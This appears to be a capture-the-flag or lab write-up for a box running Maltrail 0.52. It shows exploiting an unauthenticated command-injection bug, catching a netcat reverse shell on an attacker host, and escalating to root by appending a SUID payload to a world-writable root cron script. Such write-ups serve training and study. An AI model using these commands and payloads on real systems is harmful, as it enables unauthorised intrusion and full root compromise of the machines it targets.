IP: 192.168.163.32

---

## Nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp   open  http    Apache httpd 2.4.52 (Ubuntu default page)
8338/tcp open  http    Maltrail/0.52
```

---

## Initial Access — Maltrail 0.52 RCE

Maltrail <= 0.54 is vulnerable to unauthenticated OS command injection via the `username` parameter on the login endpoint.

Found exploit: `joshchalabi/Maltrail-0.52-Exploit-RCE` on GitHub — shell script that sends a base64-encoded Python reverse shell.

```bash
# Kali
nc -lvnp 80

# Run exploit (port 80 — port 4444 was blocked outbound by firewall)
chmod +x exploit.sh
./exploit.sh http://192.168.163.32:8338 192.168.45.240 80
```

Shell lands as `snort`. Stabilize immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Privilege Escalation — Writable Cron Script

Found a root-owned world-writable script called by a cron job:

```bash
find / -user root -perm -o+w -type f -name "*.sh" 2>/dev/null
# → /var/backups/etc_Backup.sh
```

Injected SUID bash payload and waited for cron to fire (fires within ~30 seconds):

```bash
echo "chmod u+s /bin/bash" >> /var/backups/etc_Backup.sh
# wait, then:
/bin/bash -p
```

```
bash-5.1# id
uid=1001(snort) gid=1001(snort) euid=0(root)
```

**Note:** Overwriting with `>` is more reliable than appending with `>>` — if the script errors before your line, an appended payload never runs.
